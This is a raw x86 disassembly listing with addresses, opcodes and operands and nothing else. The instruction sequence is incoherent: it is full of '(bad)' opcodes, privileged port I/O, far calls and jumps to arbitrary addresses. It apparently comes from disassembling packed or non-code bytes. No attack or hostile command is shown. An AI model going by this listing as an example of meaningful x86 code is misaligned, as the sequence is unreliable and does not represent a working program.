  41b58d:	mov    eax,ds:0x24ee8c4b
  41b592:	inc    ecx
  41b593:	sbb    dl,cl
  41b595:	(bad)  
  41b596:	fstp   DWORD PTR ds:0xc75c0b4d
  41b59c:	in     al,dx
  41b59d:	repz inc ecx
  41b59f:	and    eax,0xc84e3e42
  41b5a4:	mov    bh,0x43
  41b5a6:	ds mov ebp,0x22b1aa3d
  41b5ac:	dec    ebx
  41b5ad:	mov    DWORD PTR [ecx+0x78],ebp
  41b5b0:	fxtract 
  41b5b2:	mov    BYTE PTR cs:[esi],ch
  41b5b5:	sbb    dl,ch
  41b5b7:	pop    ebx
  41b5b8:	outs   dx,DWORD PTR ds:[esi]
  41b5b9:	movs   BYTE PTR es:[edi],BYTE PTR ds:[esi]
  41b5ba:	xor    cl,BYTE PTR [ebp+0x18]
  41b5bd:	call   0xf1d7a584
  41b5c2:	cmp    dh,dh
  41b5c4:	mov    ebp,DWORD PTR [edi+0x1b]
  41b5c7:	inc    edi
  41b5c8:	add    DWORD PTR [esp+ebp*8-0x44abcbf1],ecx
  41b5cf:	push   esi
  41b5d0:	add    cl,BYTE PTR [edx+0x76]
  41b5d3:	scas   al,BYTE PTR es:[edi]
  41b5d4:	add    al,0x87
  41b5d6:	sbb    edi,DWORD PTR [edx+0x55]
  41b5d9:	pop    ebp
  41b5da:	popf   
  41b5db:	dec    ebp
  41b5dc:	std    
  41b5dd:	xlat   BYTE PTR ds:[ebx]
  41b5de:	int3   
  41b5df:	(bad)  
  41b5e0:	cdq    
  41b5e1:	xor    BYTE PTR [ebx+0x3b],0x41
  41b5e5:	out    dx,eax
  41b5e6:	shl    DWORD PTR [ecx-0x5665d528],1
  41b5ec:	fist   DWORD PTR [eax+0x61]
  41b5ef:	dec    esp
  41b5f0:	mov    ebx,0xa6d67112
  41b5f5:	xchg   ebp,eax
  41b5f6:	add    DWORD PTR [ecx-0x3cb0d8f7],eax
  41b5fc:	neg    BYTE PTR [esi]
  41b5fe:	lea    ebp,[ecx]
  41b600:	das    
  41b601:	out    dx,eax
  41b602:	pusha  
  41b603:	out    dx,al
  41b604:	test   BYTE PTR [esi-0x1e],0x33
  41b608:	adc    bl,BYTE PTR [ebp+0x3d663a37]
  41b60e:	cmp    eax,0xf5838005
  41b613:	mov    ah,0x85
  41b615:	outs   dx,BYTE PTR ds:[esi]
  41b616:	jb     0x41b668
  41b618:	clc    
  41b619:	jb     0x41b5c0
  41b61b:	aaa    
  41b61c:	loop   0x41b690
  41b61e:	xor    esp,DWORD PTR [edx-0x5e8a7b69]
  41b624:	retf   
  41b625:	adc    edi,esi
  41b627:	adc    al,BYTE PTR [edi+0x5096ac41]
  41b62d:	push   es
  41b62e:	cli    
  41b62f:	ins    DWORD PTR es:[edi],dx
  41b630:	mov    ah,0xf0
  41b632:	add    esi,esi
  41b634:	cmps   BYTE PTR ds:[esi],BYTE PTR es:[edi]
  41b635:	mov    bh,0x8a
  41b637:	(bad)  [esi-0x4d]
  41b63a:	in     al,0x9a
  41b63c:	push   ds
  41b63d:	pop    ebp
  41b63e:	dec    esp
  41b63f:	or     al,0x74
  41b641:	pusha  
  41b642:	int3   
  41b643:	call   0x2ba7f5d4
  41b648:	rcl    BYTE PTR [eax+0x50],1
  41b64b:	rcl    BYTE PTR [eax+ebp*2+0x7d],1
  41b64f:	cdq    
  41b650:	imul   ecx,DWORD PTR [ebp+0x17],0xfffffffe
  41b654:	ret    
  41b655:	xchg   BYTE PTR [esi],ah
  41b657:	jl     0x41b5f5
  41b659:	cmp    ah,ch
  41b65b:	mov    edx,0xb424a45
  41b660:	jge    0x41b67c
  41b662:	ds xor al,0xa5
  41b665:	push   eax
  41b666:	mov    dh,0xa2
  41b668:	ret    0x4d58
  41b66b:	dec    edx
  41b66c:	loope  0x41b604
  41b66e:	jo     0x41b6e9
  41b670:	lock ja 0x41b6ce
  41b673:	pop    edx
  41b674:	pusha  
  41b675:	dec    edx
  41b676:	cs jae 0x41b6f0
  41b679:	xchg   edx,eax
  41b67a:	loopne 0x41b657
  41b67c:	cmps   BYTE PTR ds:[esi],BYTE PTR es:[edi]
  41b67d:	dec    ecx
  41b67e:	jne    0x41b680
  41b680:	jmp    0xf1838809
  41b685:	mov    ebx,0x6d4949cd
  41b68a:	and    DWORD PTR [ebx+eax*8-0x22],edx
  41b68e:	fimul  WORD PTR [edi+0x31]
  41b691:	pop    esp
  41b692:	jmp    0x41b623
  41b694:	adc    DWORD PTR [ebx+0x19],ecx
  41b697:	lds    ebx,FWORD PTR [eax]
  41b699:	mov    bh,0x4c
  41b69b:	(bad)  
  41b69c:	inc    esp
  41b69d:	mov    al,gs:0x223b64e3
  41b6a3:	sbb    cl,BYTE PTR [ebp-0x40]
  41b6a6:	pusha  
  41b6a7:	aaa    
  41b6a8:	ja     0x41b6d8
  41b6aa:	sbb    BYTE PTR [esp+eax*2+0x54],0xf5
  41b6af:	aam    0x4d
  41b6b1:	imul   edi,DWORD PTR [edi+0x4c7c1d94],0xfffffff8
  41b6b8:	jb     0x41b730
  41b6ba:	clc    
  41b6bb:	pop    ebx
  41b6bc:	pop    es
  41b6bd:	dec    ebp
  41b6be:	add    DWORD PTR [ecx-0x74],edx
  41b6c1:	pop    ebx
  41b6c2:	ja     0x41b66e
  41b6c4:	rcr    BYTE PTR [edi],1
  41b6c6:	icebp  
  41b6c7:	cld    
  41b6c8:	fwait
  41b6c9:	rol    DWORD PTR [edi+0x57],0x5
  41b6cd:	aam    0x83
  41b6cf:	push   es
  41b6d0:	frstor [edi+0x19]
  41b6d3:	inc    esi
  41b6d4:	or     al,0x54
  41b6d6:	popf   
  41b6d7:	inc    bx
  41b6d9:	movs   DWORD PTR es:[edi],DWORD PTR ds:[esi]
  41b6da:	retf   0xaf46
  41b6dd:	out    0xa,al
  41b6df:	pushw  ss
  41b6e1:	and    ebx,ebp
  41b6e3:	mov    ebx,0x4ed436b7
  41b6e8:	dec    edi
  41b6e9:	clc    
  41b6ea:	cmc    
  41b6eb:	in     eax,0x81
  41b6ed:	mov    al,ds:0x50be540
  41b6f2:	cmovne edx,DWORD PTR [ecx+0x2855b3d]
  41b6f9:	sbb    al,0xde
  41b6fb:	sub    DWORD PTR [ebx-0x75a38114],esp
  41b701:	pop    ss
  41b702:	mov    ds:0xe5997745,al
  41b707:	mov    DWORD PTR [eax+0x2],ebp
  41b70a:	jae    0x41b776
  41b70c:	sub    eax,0x5c840492
  41b711:	js     0x41b6fa
  41b713:	adc    BYTE PTR [ecx*8-0x29778db9],0x55
  41b71b:	ins    DWORD PTR es:[edi],dx
  41b71c:	xchg   esi,eax
  41b71d:	cmp    bl,dl
  41b71f:	lea    ebx,[bp+di+0x4e9e]
  41b724:	clc    
  41b725:	stos   DWORD PTR es:[edi],eax
  41b726:	xlat   BYTE PTR ds:[ebx]
  41b727:	movs   DWORD PTR es:[edi],DWORD PTR ds:[esi]
  41b728:	mov    ds,ecx
  41b72a:	dec    edx
  41b72b:	into   
  41b72c:	in     eax,0xef
  41b72e:	shl    BYTE PTR [esi],1
  41b730:	pop    ss
  41b731:	jnp    0x41b787
  41b733:	xchg   DWORD PTR [edi],ecx
  41b735:	movs   DWORD PTR es:[edi],DWORD PTR ds:[esi]
  41b736:	fs test al,0x58
  41b739:	mov    ecx,0x159fecf7
  41b73e:	dec    ecx
  41b73f:	lods   al,BYTE PTR ds:[esi]
  41b740:	call   0xe59a291e
  41b745:	and    al,0x6b
  41b747:	or     al,0x7a
  41b749:	add    DWORD PTR [edi],edx
  41b74b:	xchg   esp,eax
  41b74c:	add    DWORD PTR ds:0x509c95b7,esi
  41b752:	and    al,0x40
  41b754:	out    dx,eax
  41b755:	out    dx,eax
  41b756:	mov    dl,0x7e
  41b758:	ret    0x419d
  41b75b:	enter  0x454c,0x56
  41b75f:	add    ecx,DWORD PTR ds:0xfcc5bce
  41b765:	push   0xffffffa7
  41b767:	mov    WORD PTR [eax+0x5b128ac7],?
  41b76d:	cdq    
  41b76e:	(bad)  
  41b76f:	mov    bl,0xc
  41b771:	cld    
  41b772:	xchg   ch,ch
  41b774:	pop    esp
  41b775:	mov    ebx,0xcb27d7fa
  41b77a:	rol    DWORD PTR [edi-0x1b],0x92
  41b77e:	or     al,0x6a
  41b780:	scas   eax,DWORD PTR es:[edi]
  41b781:	and    DWORD PTR ds:0x3f408f41,ecx
  41b787:	call   0x648c:0x6325a271
  41b78e:	fsub   QWORD PTR [edx-0x19e08aa0]
  41b794:	mov    bh,0x38
  41b796:	std    
  41b797:	clc    
  41b798:	mov    ah,0x3b
  41b79a:	mov    DWORD PTR [edx],ebx
  41b79c:	icebp  
  41b79d:	mov    ebp,0xc75e9eb6
  41b7a2:	sbb    al,0xc
  41b7a4:	jb     0x41b811
  41b7a6:	icebp  
  41b7a7:	call   0xcee60c4d
  41b7ac:	mov    ecx,DWORD PTR [esi+ebx*8-0x7db97391]
  41b7b3:	test   BYTE PTR [ebp+0x3ce7235f],dl
  41b7b9:	add    al,bh
  41b7bb:	aas    
  41b7bc:	stos   DWORD PTR es:[edi],eax
  41b7bd:	or     BYTE PTR ds:0xe067b5a6,0x12
  41b7c4:	push   0x1699f8d6
  41b7c9:	(bad)  
  41b7ca:	and    dl,BYTE PTR [edx+edi*2]
  41b7cd:	sbb    al,0x5b
  41b7cf:	push   ds
  41b7d0:	sahf   
  41b7d1:	cmp    ebp,DWORD PTR [edx]
  41b7d3:	pop    edx
  41b7d4:	cmp    DWORD PTR [edx],eax
  41b7d6:	jle    0x41b7f7
  41b7d8:	jnp    0x41b7c4
  41b7da:	add    eax,0x97782946
  41b7df:	or     esi,ecx
  41b7e1:	repz pop eax
  41b7e3:	inc    esi
  41b7e4:	lea    eax,[ecx+0xc4b39b5]
  41b7ea:	add    BYTE PTR [ecx+0x427a05f],al
  41b7f0:	jns    0x41b801
  41b7f2:	sub    bh,bl
  41b7f4:	sbb    al,0xd
  41b7f6:	call   0x9a6cea36
  41b7fb:	cmps   DWORD PTR ds:[esi],DWORD PTR es:[edi]
  41b7fc:	dec    edx
  41b7fd:	sbb    ch,BYTE PTR [ecx+0x68]
  41b800:	dec    esp
  41b801:	adc    BYTE PTR [ebp-0x6e],al
  41b804:	push   edi
  41b805:	ds test eax,0xa1387df9
  41b80b:	pop    edx
  41b80c:	jg     0x41b82a
  41b80e:	in     eax,0xbe
  41b810:	mov    edx,0x5362ebd2
  41b815:	je     0x41b88d
  41b817:	inc    edi
  41b818:	mov    edi,0xeecbf473
  41b81d:	ins    BYTE PTR es:[edi],dx
  41b81e:	push   esp
  41b81f:	ror    BYTE PTR [edx-0x47],0x4b
  41b823:	fs inc esp
  41b825:	mov    ah,0xa
  41b827:	pop    esp
  41b828:	push   esp
  41b829:	lock rol BYTE PTR [edi+0xd],cl
  41b82d:	push   cs
  41b82e:	enter  0xce99,0x8f
  41b832:	stos   DWORD PTR es:[edi],eax
  41b833:	clc    
  41b834:	and    BYTE PTR [eax],ah
  41b836:	cmp    eax,0x558098fa
  41b83b:	fst    DWORD PTR [ebp+0x581444b1]
  41b841:	aas    
  41b842:	cmp    DWORD PTR [esi-0x6b],ebx
  41b845:	loope  0x41b7dd
  41b847:	and    DWORD PTR [esi],ebp
  41b849:	dec    bx
  41b84b:	bnd jl 0x41b84f
  41b84e:	or     esp,DWORD PTR [edi-0x65c62a23]
  41b854:	clc    
  41b855:	mov    ss,ebx
  41b857:	aaa    
  41b858:	sub    DWORD PTR [ecx+0x3d],esp
  41b85b:	and    BYTE PTR [eax+0x7e6cc5a8],0xeb
  41b862:	cmp    DWORD PTR [ecx],eax
  41b864:	push   0xd38ef8f1
  41b869:	int3   
  41b86a:	dec    eax
  41b86b:	arpl   WORD PTR [ebx-0x3a45f7a4],bx
  41b871:	mov    eax,edx
  41b873:	push   esp
  41b874:	xor    al,0x4e
  41b876:	jmp    esp
  41b878:	jne    0x41b8c0
  41b87a:	xchg   edi,eax
  41b87b:	clc    
  41b87c:	sub    al,BYTE PTR [ebp+0x107a206d]
  41b882:	rcr    ebp,cl
  41b884:	shr    DWORD PTR [ecx-0x5a966a75],cl
  41b88a:	push   ss
  41b88b:	pop    ecx
  41b88c:	push   ebp
  41b88d:	stos   BYTE PTR es:[edi],al
  41b88e:	add    DWORD PTR [edx-0x3ea0e6a3],0x651638ef
  41b898:	or     BYTE PTR [edi+ecx*4+0x7896c358],dh
  41b89f:	mov    WORD PTR [edx+ebp*2-0x5],ds
  41b8a3:	rol    BYTE PTR ds:0x82d89e48,0x8
  41b8aa:	into   
  41b8ab:	scas   al,BYTE PTR es:[edi]
  41b8ac:	dec    ecx
  41b8ad:	push   ds
  41b8ae:	dec    edx
  41b8af:	dec    ebx
  41b8b0:	in     al,0xd
  41b8b2:	into   
  41b8b3:	movs   DWORD PTR es:[edi],DWORD PTR ds:[esi]
  41b8b4:	pop    es
  41b8b5:	adc    cl,dh
  41b8b7:	and    DWORD PTR [edx-0x7dd1edb4],esp
  41b8bd:	xor    DWORD PTR [edx],0x54
  41b8c0:	imul   ebx,edx,0xffffff95
  41b8c3:	(bad)  
  41b8c4:	xchg   ecx,eax
  41b8c5:	lods   eax,DWORD PTR ds:[esi]
  41b8c6:	xor    BYTE PTR [edi+0x563f554c],cl
  41b8cc:	hlt    
  41b8cd:	(bad)  
  41b8ce:	or     DWORD PTR ds:[ecx],ebp
  41b8d1:	sbb    DWORD PTR [eax-0x13c4115c],esi
  41b8d7:	jl     0x41b8e4
  41b8d9:	jmp    0x3f:0x350fa53b
  41b8e0:	popf   
  41b8e1:	pop    es
  41b8e2:	mov    ah,0xd3
  41b8e4:	xchg   ecx,eax
  41b8e5:	mov    ch,0xc0
  41b8e7:	jae    0x41b95e
  41b8e9:	cs aam 0x7d
  41b8ec:	cli    
  41b8ed:	adc    BYTE PTR [ecx+0x50ac9a21],bh
  41b8f3:	push   esi
  41b8f4:	ficom  WORD PTR [esi+esi*4-0x65ce13ba]
  41b8fb:	push   0x63346fcc
  41b900:	fild   WORD PTR [edi-0x60e1b526]
  41b906:	xchg   ebx,eax
  41b907:	and    al,0x95
  41b909:	in     eax,dx
  41b90a:	sbb    edx,DWORD PTR [ebp-0x16]
  41b90d:	int    0xe3
  41b90f:	jl     0x41b964
  41b911:	or     ch,BYTE PTR [edx-0x5a]
  41b914:	nop
	...
  41b921:	adc    eax,0x7fd60e68
  41b926:	neg    ch
  41b928:	jmp    0x41b991
  41b92a:	cli    
  41b92b:	and    BYTE PTR [esi+0x15],ah
  41b92e:	cmp    DWORD PTR [ebx],eax
  41b930:	enter  0x3619,0x1
  41b934:	add    BYTE PTR [ebx+eax*1+0x55510000],ch
  41b93b:	shr    ch,cl
  41b93d:	fcmovnu st,st(1)
  41b93f:	dec    edi
  41b940:	fsub   st(6),st
  41b942:	cmp    eax,0x569308fe
  41b947:	jnp    0x41b993
  41b949:	int3   
  41b94a:	gs out dx,eax
  41b94c:	push   esi
  41b94d:	mov    ds:0xe6398c6c,eax
  41b952:	pop    eax
  41b953:	dec    ebp
  41b954:	sub    ah,BYTE PTR [ebx]
  41b956:	xor    DWORD PTR fs:[edi+0x1],edi
  41b95a:	ficom  DWORD PTR [eax]
  41b95c:	xchg   esi,eax
  41b95d:	sub    al,0xd8
  41b95f:	add    DWORD PTR [ebx+0x66],eax
  41b962:	stos   DWORD PTR es:[edi],eax
  41b963:	call   0x44fb:0xf558e484
  41b96a:	or     al,BYTE PTR [esi+ebp*4]
  41b96d:	sub    BYTE PTR [ebp+edx*2+0x9],bl
  41b971:	scas   eax,DWORD PTR es:[edi]
  41b972:	int3   
  41b973:	fwait
  41b974:	pop    esi
  41b975:	jns    0x41b946
  41b977:	mov    fs,WORD PTR [ebp-0x7a]
  41b97a:	cmp    bl,BYTE PTR [edi-0x43]
  41b97d:	mov    ?,WORD PTR [ecx+0x57]
  41b980:	call   0xaf41:0x55e97375
  41b987:	mov    eax,ds:0xb6cdbfd
  41b98c:	inc    esi
  41b98d:	add    al,0x36
  41b98f:	cmps   BYTE PTR ds:[esi],BYTE PTR es:[edi]
  41b990:	cmp    ebx,DWORD PTR [ebx-0x3899351]
  41b996:	addr16 cmp al,0xa6
  41b999:	jl     0x41b9c7
  41b99b:	jecxz  0x41b9d5
  41b99d:	mov    dl,0x1
  41b99f:	xchg   ebx,eax
  41b9a0:	ins    BYTE PTR es:[edi],dx
  41b9a1:	jae    0x41b9b7
  41b9a3:	int    0x9d
  41b9a5:	fnstcw WORD PTR fs:[esi]
  41b9a8:	adc    al,0x44
  41b9aa:	and    al,0xe
  41b9ac:	adc    ch,bh
  41b9ae:	or     dh,BYTE PTR [ebp-0x45ca64c]
  41b9b4:	sbb    bh,BYTE PTR [ebx+0x1]
  41b9b7:	sub    bh,al
  41b9b9:	shr    DWORD PTR [ebx+0x16],0x31
  41b9bd:	adc    al,0xd4
  41b9bf:	xor    ecx,DWORD PTR [ebx]
  41b9c1:	(bad)  
  41b9c2:	repz mov ah,0x4b
  41b9c5:	loop   0x41b9af
  41b9c7:	jmp    0xb49d9330
  41b9cc:	mov    edx,0x4096daf
  41b9d1:	nop
  41b9d2:	repz inc esi
  41b9d4:	retf   
  41b9d5:	jns    0x41b9b1
  41b9d7:	dec    DWORD PTR [ebx-0x69]
  41b9da:	stc    
  41b9db:	test   al,0x67
  41b9dd:	retf   0xaa9d
  41b9e0:	pop    eax
  41b9e1:	mov    ds:0x9d1cb4f5,eax
  41b9e6:	scas   eax,DWORD PTR es:[edi]
  41b9e7:	sbb    al,0x6b
  41b9e9:	mov    cl,0xda
  41b9eb:	cmp    al,0x30
  41b9ed:	add    dl,BYTE PTR [edi-0x5c5ef0e0]
  41b9f3:	test   BYTE PTR [esi-0x38972651],ch
  41b9f9:	pushf  
  41b9fa:	pushf  
  41b9fb:	jmp    0x9a53e38c
  41ba00:	out    0xc5,al
  41ba02:	cld    
  41ba03:	(bad)  
  41ba04:	jns    0x41ba81
  41ba06:	adc    eax,0x2768654f
  41ba0b:	add    eax,0xea36b276
  41ba10:	dec    ebp
  41ba11:	xchg   edi,eax
  41ba12:	inc    ebx
  41ba13:	jg     0x41b9dd
  41ba15:	push   es
  41ba16:	int3   
  41ba17:	(bad)  
  41ba18:	mov    ecx,0x8697af98
  41ba1d:	ins    BYTE PTR es:[edi],dx
  41ba1e:	sti    
  41ba1f:	adc    al,0x19
  41ba21:	push   esp
  41ba22:	jne    0x41b9d6
  41ba24:	iret   
  41ba25:	push   ds
  41ba26:	cmp    al,0x52
  41ba28:	in     eax,0xaf
  41ba2a:	out    0x24,eax
  41ba2c:	jo     0x41b9e4
  41ba2e:	int    0xb
  41ba30:	jp     0x41ba04
  41ba32:	cmp    edx,DWORD PTR [eax-0x3e876a73]
  41ba38:	js     0x41ba01
  41ba3a:	and    eax,0x34feed8a
  41ba3f:	outs   dx,DWORD PTR ds:[esi]
  41ba40:	test   al,0x33
  41ba42:	add    cl,BYTE PTR [ebp+0x78e3c8da]
  41ba48:	cmp    al,BYTE PTR [eax-0x6c]
  41ba4b:	out    dx,al
  41ba4c:	imul   esi,edi,0xffffff94
  41ba4f:	cwde   
  41ba50:	sbb    DWORD PTR [edi-0x6],esp
  41ba53:	jg     0x41ba68
  41ba55:	es mov ebp,0x3780b2db
  41ba5b:	inc    edx
  41ba5c:	hlt    
  41ba5d:	inc    esi
  41ba5e:	shl    ecx,1
  41ba60:	jae    0x41baa7
  41ba62:	mov    ch,0x6e
  41ba64:	pop    es
  41ba65:	jl     0x41ba30
  41ba67:	jmp    0xd3261b88
  41ba6c:	nop
  41ba6d:	or     edx,0x1a
  41ba70:	or     BYTE PTR [edi-0x14f93059],ah
  41ba76:	xchg   esi,eax
  41ba77:	mov    ebp,0xfbd9d1a7
  41ba7c:	sbb    al,BYTE PTR [edx]
  41ba7e:	aaa    
  41ba7f:	inc    eax
  41ba80:	sub    al,0x64
  41ba82:	pop    ss
  41ba83:	jns    0x41bacf
  41ba85:	lds    esi,FWORD PTR [ebx-0x5528a8b5]
  41ba8b:	shl    BYTE PTR [edi],0xbb
  41ba8e:	int    0x95
  41ba90:	pop    esi
  41ba91:	test   eax,0xf486ee11
  41ba96:	mov    dh,0x94
  41ba98:	clc    
  41ba99:	repz ret 
  41ba9b:	xchg   edi,eax
  41ba9c:	mov    edx,0x3a8a310c
  41baa1:	popf   
  41baa2:	jmp    0x8704ee3f
  41baa7:	jge    0x41bb0f
  41baa9:	mov    al,ds:0xb86bdd6b
  41baae:	push   ebp
  41baaf:	(bad)  
  41bab0:	xchg   esi,eax
  41bab1:	jno    0x41ba4d
  41bab3:	and    edi,0x13067c94
  41bab9:	xor    BYTE PTR [ecx-0x1a],al
  41babc:	inc    edx
  41babd:	cmp    BYTE PTR [ecx+0x4ba9b8de],bh
  41bac3:	test   al,0x8a
  41bac5:	inc    ebp
  41bac6:	cmp    esi,DWORD PTR [eax-0x828596c]
  41bacc:	call   0x36d6:0x67626608
  41bad3:	xor    ebx,DWORD PTR [eax-0x71]
  41bad6:	imul   ecx,DWORD PTR ds:0xb41a6d58,0xbdfdc8ba
  41bae0:	xor    ecx,DWORD PTR [ebx-0x66c53e63]
  41bae6:	adc    ebx,edx
  41bae8:	lock and eax,0x72d42d17
  41baee:	mov    ds:0x83fb47d4,al
  41baf3:	jp     0x41bb42
  41baf5:	je     0x41bb02
  41baf7:	dec    esp
  41baf8:	jecxz  0x41ba9e
  41bafa:	pop    edi
  41bafb:	stc    
  41bafc:	inc    edx
  41bafd:	mov    ds:0xed84da07,eax
  41bb02:	and    al,0xf4
  41bb04:	je     0x41baa4
  41bb06:	xchg   esi,eax
  41bb07:	out    0xf5,al
  41bb09:	mov    eax,ds:0xcc936d7f
  41bb0e:	enter  0x4c38,0x3a
  41bb12:	iret   
  41bb13:	or     ecx,DWORD PTR [esi]
  41bb15:	adc    DWORD PTR [esi-0x4a],eax
  41bb18:	sbb    al,0xc0
  41bb1a:	sub    edi,DWORD PTR [eax-0x27]
  41bb1d:	inc    ebp
  41bb1e:	ins    BYTE PTR es:[edi],dx
  41bb1f:	push   eax
  41bb20:	inc    ecx
  41bb21:	jno    0x41bb86
  41bb23:	and    al,0xbe
  41bb25:	retf   0x5743
  41bb28:	mov    DWORD PTR [esi+0x2a],ebx
  41bb2b:	xor    eax,0x5ac3880c
  41bb30:	std    
  41bb31:	inc    ebx
  41bb32:	test   DWORD PTR [edx+0x56478a45],0x794508ba
  41bb3c:	shl    DWORD PTR [ebp+0x4d],0xf8
  41bb40:	movs   BYTE PTR es:[edi],BYTE PTR ds:[esi]
  41bb41:	pop    esi
  41bb42:	jns    0x41bb29
  41bb44:	retf   0xea1f
  41bb47:	out    dx,al
  41bb48:	add    esp,ebp
  41bb4a:	aad    0x2c
  41bb4c:	pop    eax
  41bb4d:	lea    edx,[edi]
  41bb4f:	xchg   edi,eax
  41bb50:	fwait
  41bb51:	inc    edi
  41bb52:	jno    0x41bb9b
  41bb54:	dec    edi
  41bb55:	sbb    esi,DWORD PTR [edi+0x7e4e174f]
  41bb5b:	ds jl  0x41bb1e
  41bb5e:	mov    cs,WORD PTR ds:0x12646635
  41bb64:	in     eax,0x5a
  41bb66:	cmc    
  41bb67:	push   ds
  41bb68:	arpl   bp,sp
  41bb6a:	fwait
  41bb6b:	retf   
  41bb6c:	(bad)  
  41bb6d:	pop    ecx
  41bb6e:	mov    BYTE PTR [ebx-0x7b],dh
  41bb71:	mov    ds:0x84eec6df,eax
  41bb76:	push   esi
  41bb77:	sbb    al,0xea
  41bb79:	or     al,0xe2
  41bb7b:	mov    BYTE PTR [edx],0x32
  41bb7e:	(bad)  
  41bb7f:	daa    
  41bb80:	dec    eax
  41bb81:	pop    edx
  41bb82:	mov    dl,al
  41bb84:	mov    eax,ds:0x10b7d16c
  41bb89:	cmp    esp,eax
  41bb8b:	call   FWORD PTR [ecx+0x6d6f25cf]
  41bb91:	jg     0x41bb7c
  41bb93:	imul   edx,DWORD PTR [ebx],0x1a45fc19
  41bb99:	sahf   
  41bb9a:	(bad)  [eax-0x69]
  41bb9d:	and    eax,0xe1490071
  41bba2:	sbb    DWORD PTR [ecx+0x49],ebp
  41bba5:	je     0x41bbca
  41bba7:	ss and eax,0x6fb5a31b
  41bbad:	xchg   ecx,eax
  41bbae:	shr    BYTE PTR cs:[ecx],0xf6
  41bbb2:	sub    edx,DWORD PTR [edi+esi*4-0x5f]
  41bbb6:	test   DWORD PTR [esi-0x49],esp
  41bbb9:	(bad)  
  41bbba:	jmp    0x41bbc2
  41bbbc:	mov    eax,ds:0xf79e49c4
  41bbc1:	pusha  
  41bbc2:	pop    ecx
  41bbc3:	push   ss
  41bbc4:	fcmovnu st,st(0)
  41bbc6:	sub    ebx,DWORD PTR [edx+0x4b]
  41bbc9:	mul    BYTE PTR [ebx]
  41bbcb:	push   edx
  41bbcc:	movs   BYTE PTR es:[edi],BYTE PTR ds:[esi]
  41bbcd:	or     DWORD PTR [edi+esi*4-0xd],edi
  41bbd1:	std    
  41bbd2:	outs   dx,DWORD PTR ds:[esi]
  41bbd3:	pop    edi
  41bbd4:	lahf   
  41bbd5:	ror    DWORD PTR [edx+ebp*8-0x6f383371],0xe8
  41bbdd:	cwde   
  41bbde:	shr    dl,cl
  41bbe0:	fisttp WORD PTR [edi+0x67]
  41bbe3:	dec    ecx
  41bbe4:	pop    ebx
  41bbe5:	mov    ah,0xd3
  41bbe7:	cmc    
  41bbe8:	movs   BYTE PTR es:[edi],BYTE PTR ds:[esi]
  41bbe9:	daa    
  41bbea:	push   ebp
  41bbeb:	adc    BYTE PTR [esi],bl
  41bbed:	mov    WORD PTR ds:0x2026dc6,?
  41bbf3:	sub    al,0xf7
  41bbf5:	fmul   st,st(1)
  41bbf7:	fmul   DWORD PTR [ebx+0x41]
  41bbfa:	les    ecx,FWORD PTR [edx+0x50]
  41bbfd:	push   cs
  41bbfe:	fnstcw WORD PTR [ebp-0x6]
  41bc01:	push   0xb87b1812
  41bc06:	or     DWORD PTR [ebp+0x40423ac],0x22fab9ca
  41bc10:	shl    DWORD PTR [edi+esi*2+0x2fb1476b],0x47
  41bc18:	or     edi,0xbbb4125f
  41bc1e:	push   ss
  41bc1f:	iret   
  41bc20:	sbb    eax,0xd9168e8c
  41bc25:	xor    bl,BYTE PTR [ebp-0x6c]
  41bc28:	cmp    eax,0xb25e299e
  41bc2d:	xchg   ecx,eax
  41bc2e:	hlt    
  41bc2f:	xor    al,0xa1
  41bc31:	push   esp
  41bc32:	ret    0xba48
  41bc35:	cdq    
  41bc36:	push   esi
  41bc37:	in     eax,dx
  41bc38:	cmp    DWORD PTR [eax-0x16],ecx
  41bc3b:	sbb    eax,0x2ce58b0d
  41bc40:	cmps   DWORD PTR ds:[esi],DWORD PTR es:[edi]
  41bc41:	xchg   edx,eax
  41bc42:	push   cs
  41bc43:	mov    BYTE PTR ds:0x1a44e41f,0x95
  41bc4a:	lods   eax,DWORD PTR ds:[esi]
  41bc4b:	or     al,0x11
  41bc4d:	fadd   DWORD PTR cs:[edi-0x5b]
  41bc51:	mov    edi,0x8d9d4b88
  41bc56:	nop
  41bc57:	pushf  
  41bc58:	adc    esp,DWORD PTR [ebx-0x32]
  41bc5b:	or     al,0xf8
  41bc5d:	stos   DWORD PTR es:[edi],eax
  41bc5e:	push   eax
  41bc5f:	mov    ecx,0x4bbd3bd3
  41bc64:	or     al,0x2c
  41bc66:	(bad)  
  41bc67:	ficomp DWORD PTR [edi+ebp*4+0x7e]
  41bc6b:	call   0xe1c4:0xd6fe81df
  41bc72:	add    eax,0x2963b442
  41bc77:	vaddpd ymm4,ymm1,ymm3
  41bc7b:	retf   
  41bc7c:	sbb    DWORD PTR ds:0x27645418,eax
  41bc82:	xor    BYTE PTR [eax+0x1a917bfd],dl
  41bc88:	jnp    0x41bc13
  41bc8a:	(bad)  
  41bc8b:	xor    DWORD PTR [esi+0x4386c970],esp
  41bc91:	jg     0x41bc5a
  41bc93:	dec    ebx
  41bc94:	(bad)  
  41bc95:	cs jnp 0x41bc78
  41bc98:	mov    bl,0xce
  41bc9a:	outs   dx,BYTE PTR ds:[esi]
  41bc9b:	jb     0x41bc71
  41bc9d:	and    cl,cl
  41bc9f:	call   FWORD PTR ds:0x78ff3301
  41bca5:	pop    ds
  41bca6:	or     eax,0xb422ad06
  41bcab:	add    eax,0xa6d74cb5
  41bcb0:	cmp    al,0x9d
  41bcb2:	cmp    BYTE PTR [edi],0x64
  41bcb5:	add    esi,DWORD PTR [esi-0x728c4ba7]
  41bcbb:	mov    ebx,0x352cefd3
  41bcc0:	ror    DWORD PTR [ebx+0x47],0x79
  41bcc4:	mov    es,eax
  41bcc6:	ds push esi
  41bcc8:	inc    ebp
  41bcc9:	xor    eax,0x5d21d5c2
  41bcce:	ins    DWORD PTR es:[edi],dx
  41bccf:	in     eax,0x61
  41bcd1:	aad    0x50
  41bcd3:	inc    ebp
  41bcd4:	scas   eax,DWORD PTR es:[edi]
  41bcd5:	out    0x1e,al
  41bcd7:	jmp    0x2fbc9932
  41bcdc:	or     bh,BYTE PTR [eax+0x7d8d276]
  41bce2:	or     edi,0x4c
	...
  41bcf1:	cld    
  41bcf2:	mov    WORD PTR [ebx+edx*8-0x5000040c],?
  41bcf9:	and    al,0xd
  41bcfb:	jmp    0x41bd54
  41bcfd:	cmp    esp,DWORD PTR [edx+0x39c5a491]
  41bd03:	add    DWORD PTR [eax],eax
  41bd05:	lods   al,BYTE PTR ds:[esi]
  41bd06:	add    eax,DWORD PTR [eax]
  41bd08:	add    BYTE PTR [edi],bh
  41bd0a:	je     0x41bca7
  41bd0c:	xchg   edi,eax
  41bd0d:	push   esi
  41bd0e:	jae    0x41bd76
  41bd10:	cmps   BYTE PTR ds:[esi],BYTE PTR es:[edi]
